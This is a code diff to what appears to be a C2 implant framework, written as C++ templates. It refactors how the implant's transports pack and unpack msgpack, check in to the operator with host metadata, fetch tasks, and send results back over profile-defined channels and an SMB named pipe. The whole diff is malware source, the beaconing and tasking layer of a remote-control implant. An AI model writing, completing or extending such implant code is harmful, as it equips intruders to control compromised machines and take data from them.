@@ -6,6 +6,7 @@
 #include "core/settings.h"
 #include "comms/smb.h"
 #include "data/transforms/transforms.h"
+#include "modules/metadata.h"
 
 // ==========================================================
 // BASE INTERFACES
@@ -15,19 +16,51 @@
 // but makes it easier IMO to track/structure. 
 class IIngressTransport {
 public:
-    virtual ~IIngressTransport() = default;
-    // our "sleep" function, or what to wait for. 
-    // Universal for a sleep time, or someting like a pipe that waits
-    virtual HANDLE get_wait_handle() = 0; 
-    //func to get our task
-    virtual nlohmann::json fetch_task(const std::string& uuid) = 0;
+	virtual ~IIngressTransport() = default;
+	// our "sleep" function, or what to wait for. 
+	// Universal for a sleep time, or someting like a pipe that waits
+	virtual HANDLE get_wait_handle() = 0;
+	//func to get our task
+	virtual nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) = 0;
+
+    //protected = only members/children can use
+protected:
+    std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
+        return nlohmann::json::to_msgpack(json_data);
+    }
+
+    nlohmann::json unpack_to_json(const std::vector<uint8_t> msgpack_data) {
+        try {
+            nlohmann::json result = nlohmann::json::from_msgpack(msgpack_data);
+            return result;
+        }
+        catch (nlohmann::json::parse_error& e) {
+            std::cerr << "JSON Parse Error: " << e.what() << std::endl;
+            std::cerr << "Byte position of error: " << e.byte << std::endl;
+
+            // PRINT THE RAW HEX to see what you actually received
+            std::cerr << "Raw Buffer (Hex): ";
+            for (auto byte : msgpack_data) {
+                printf("%02X ", (unsigned char)byte);
+            }
+            std::cout << std::endl;
+
+            return nlohmann::json(); // Return null json to prevent crash
+        }
+    }
 };
 
 class IEgressTransport {
 public:
     virtual ~IEgressTransport() = default;
     //func to send response
-    virtual void send_response(const std::string& uuid, std::vector<uint8_t> task_response_msgpack_list) = 0;
+    virtual void send_response(const std::string& uuid, const nlohmann::json& task_response_array) = 0;
+
+protected:
+    std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
+        return nlohmann::json::to_msgpack(json_data);
+    }
+
 };
 
 // ==========================================================
@@ -38,7 +71,7 @@ public:
 
 [%- for c2_get_profile in get_function_mappings.values() %]
 
-nlohmann::json [[ c2_get_profile.value]](std::string implant_uuid);
+std::vector<uint8_t> [[ c2_get_profile.value]](std::vector<uint8_t> metadata_as_msgpack);
 
 [%- endfor %]
 
@@ -63,9 +96,36 @@ public:
     HANDLE get_wait_handle() override {
         return NULL;
     }
-    nlohmann::json fetch_task(const std::string& uuid) override {
-        return [[ c2_get_profile.value ]](uuid);
-    }
+
+	nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) override {
+        //Note - moved logic of msgpack/metadata to this, instead of inside of each transport
+        //method. This keeps everythign cleaner/less tied together
+        nlohmann::json metadata = nlohmann::json();
+        std::vector<uint8_t> metadata_as_msgpack;
+
+        //if we want to include full metdata
+        if (full_metadata) {
+            metadata = populate_metadata();
+        }
+
+        //add implant uuid to data
+        metadata["implant_uuid"] = uuid;
+        
+        //pack metadata
+        metadata_as_msgpack = this->pack_to_msgpack(metadata);
+
+        //send checkin
+        std::vector<uint8_t> response = [[ c2_get_profile.value ]](metadata_as_msgpack);
+        
+        nlohmann::json task_array = nlohmann::json::array();
+        if (!response.empty()) {
+            //unpack response
+            task_array = this->unpack_to_json(response);
+        }
+
+        return task_array;
+	}
+
 };
 
 [%- endfor %]
@@ -74,8 +134,12 @@ public:
 
 class [[ c2_post_profile.value ]]_class : public IEgressTransport {
 public:
-    void send_response(const std::string& uuid, std::vector<uint8_t> task_response_msgpack_list) override {
-        [[ c2_post_profile.value ]](uuid, task_response_msgpack_list);
+    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
+        
+        std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
+
+		[[ c2_post_profile.value ]](uuid, task_response_msgpack_list);
+        
     }
 };
 
@@ -155,7 +219,7 @@ public:
         return h_event_;
     }
 
-    nlohmann::json fetch_task(const std::string& uuid) override {
+    nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) override {
         // If we are here, WaitForMultipleObjects signaled that our read finished!
         DWORD bytes_transferred = 0;
 
@@ -207,7 +271,10 @@ public:
         if (h_event_) CloseHandle(h_event_);
     }
 
-    void send_response(const std::string& uuid, std::vector<uint8_t> batched_data) override {
+    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
+
+        std::vector<uint8_t> batched_data = this->pack_to_msgpack(task_response_array);
+
         if (batched_data.empty() || h_outbox_ == INVALID_HANDLE_VALUE) {
             return;
         }
